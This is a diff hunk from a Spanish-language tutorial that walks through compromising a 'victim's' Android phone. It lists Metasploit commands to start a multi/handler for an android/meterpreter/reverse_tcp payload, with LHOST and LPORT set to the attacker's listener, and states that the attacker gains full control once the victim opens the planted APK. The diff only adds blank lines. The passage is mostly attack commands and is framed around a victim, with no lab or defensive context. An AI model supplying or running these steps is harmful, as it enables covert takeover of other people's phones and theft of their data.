@@ -38,10 +38,15 @@ Ahora, nuestro payload se ha guardado en la carpeta que tengamos por defecto en 
 Una vez hayamos introducido el payload en el móvil de nuestra víctima ponemos los siguientes comandos:
 
 msfconsole -> Iniciamos la aplicación de monitoreo
+
 use multi/handler
+
 set PAYLOAD android/meterpreter/reverse_tcp -> Indicamos cual payload queremos detectar
+
 set LHOST xxxx -> Indicamos la IP asignada al payload. (la misma que hemos asignado a la hora de generarlo)
+
 set LPORT xxxx -> Indicamos el puerto asignado al payload (el mismo que hemos asignado a la hora de generarlo)
+
 exploit  -> para iniciar el ataque.
 
 Una vez llegados a este punto, si la víctima abre el apk deberemos tener control total sobre el teléfono.
